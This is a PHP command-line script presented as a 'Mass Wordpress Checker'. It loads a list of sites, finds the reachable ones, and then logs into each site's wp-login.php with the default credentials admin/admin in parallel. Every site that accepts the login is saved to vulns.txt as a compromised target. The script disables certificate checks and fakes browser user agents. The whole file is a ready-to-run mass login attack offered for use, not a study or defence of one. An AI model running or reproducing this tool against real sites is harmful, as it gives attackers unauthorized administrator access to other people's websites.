<?php

error_reporting(0);

include("keys.php");

function wp_bruteforcer($wp_sites) {

    $login = "admin";
    $password = 'admin';
    $cookie = "cookie.txt";

    $postdata = "log=" . $login . "&pwd=" . $password . "&wp-submit=Log%20In";

    $node_count = count($wp_sites);
    $curl_arr = array();
    $vulns = array();
    $master = curl_multi_init();
    $agent = "Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20110324 Firefox/4.2a1pre";

    for($i = 0; $i < $node_count; $i++)
    {
        $url = $wp_sites[$i]."wp-login.php";
        $url = preg_replace("/^http:/i", "https:", $url);

        $curl_arr[$i] = curl_init($url);
        curl_setopt($curl_arr[$i], CURLOPT_USERAGENT, $agent);
        curl_setopt($curl_arr[$i], CURLOPT_POST, 1);
        curl_setopt($curl_arr[$i], CURLOPT_POSTFIELDS, $postdata);
        curl_setopt($curl_arr[$i], CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl_arr[$i], CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($curl_arr[$i], CURLOPT_SSL_VERIFYHOST,false);
        curl_setopt($curl_arr[$i], CURLOPT_SSL_VERIFYPEER,false);
        curl_setopt($curl_arr[$i], CURLOPT_MAXREDIRS, 10);
        curl_setopt($curl_arr[$i], CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($curl_arr[$i], CURLOPT_TIMEOUT, 20);
        curl_setopt($curl_arr[$i], CURLOPT_COOKIEJAR, $cookie);
        curl_setopt($curl_arr[$i], CURLOPT_COOKIEFILE, $cookie);
        curl_setopt($curl_arr[$i], CURLOPT_REFERER, $url);

        curl_multi_add_handle($master, $curl_arr[$i]);
    }

    do {
        curl_multi_exec($master,$running);
    } while($running > 0);

    for($i = 0; $i < $node_count; $i++)
    {
        $results[] = curl_multi_getcontent  ( $curl_arr[$i]  );
        $site[] = curl_getinfo  ( $curl_arr[$i]  );
        if(strpos($results[$i], "Customise Your Site")) {
          $vulns[] = $site[$i]['url'];
        }
    }

    echo "[*] Vulns: ". count($vulns) . "\n";
    $counter = 0;

    if(count($vulns) != 0) {
        echo "[*] Saving results to vulns.txt\n";
        $fp = fopen('vulns.txt', 'a');
        while($counter < count($vulns)) {
          fwrite($fp, $vulns[$counter] ."\n");
          $counter++;
        }
    }

}


function wp_checker($urls) {

     $wp_sites = array();
     $nodes = array();
     $count = 0;

     while($count < count($urls)) {

       $link = trim(preg_replace('/\s\s+/', ' ', $urls[$count]));

       if($link != "/wp-login.php") {
         $nodes[] = $link;
       }
       $count++;
     }

     $node_count = count($nodes);
     echo "\n[*] Loaded: " . $node_count."\n";

     $curl_arr = array();
     $master = curl_multi_init();

     for($i = 0; $i < $node_count; $i++)
     {
         $url = $nodes[$i];
         $curl_arr[$i] = curl_init($url);
         curl_setopt($curl_arr[$i], CURLOPT_RETURNTRANSFER, true);
         curl_setopt($curl_arr[$i], CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)");
         curl_setopt($curl_arr[$i], CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($curl_arr[$i], CURLOPT_SSL_VERIFYHOST,false);
         curl_setopt($curl_arr[$i], CURLOPT_SSL_VERIFYPEER,false);
         curl_setopt($curl_arr[$i], CURLOPT_MAXREDIRS, 10);
         curl_setopt($curl_arr[$i], CURLOPT_CONNECTTIMEOUT, 3);
         curl_setopt($curl_arr[$i], CURLOPT_TIMEOUT, 20);
         curl_multi_add_handle($master, $curl_arr[$i]);
     }

     do {
         curl_multi_exec($master,$running);
     } while($running > 0);

     for($i = 0; $i < $node_count; $i++)
     {
         $results[] = curl_getinfo  ( $curl_arr[$i]  );
         $code = $results[$i]["http_code"];

         if($code == "200") {
           $wp_sites[] = $results[$i]['url'];
         }
     }

     $len = count($wp_sites);
     echo "[*] WP_Sites: ". $len . "\n";
     return $wp_sites;
}


function load_urls() {

  $file = fopen("sites.txt", "r");
  $urls = array();

  while (!feof($file)) {
     $urls[] = fgets($file);
  }
  fclose($file);
  return $urls;
}



function banner() {

  echo "  _   _                 ____                       _ _           \n";
  echo " | | | | ___  __ _ _ __/ ___|  ___  ___ _   _ _ __(_) |_ _   _   \n";
  echo " | |_| |/ _ \/ _` | '__\___ \ / _ \/ __| | | | '__| | __| | | |  \n";
  echo " |  _  |  __/ (_| | |   ___) |  __/ (__| |_| | |  | | |_| |_| |  \n";
  echo " |_| |_|\___|\__,_|_|  |____/ \___|\___|\__,_|_|  |_|\__|\__, |  \n";
  echo "                                                         |___/   ";

    echo "\n-------------------------\n";
    echo "   Author: HearSecurity  \n";
    echo "----------------------------------\n";
    echo "   Tool: Mass Wordpress Checker   \n";
    echo "----------------------------------\n";
    echo "   Usage: wp-login.php check      \n";
    echo "-----------------------------------\n\n";
}



if(($argv[1] == "check")) {

    $urls = load_urls();
    $wp_sites = wp_checker($urls);
    wp_bruteforcer($wp_sites);

}else{
    banner();
}

?>
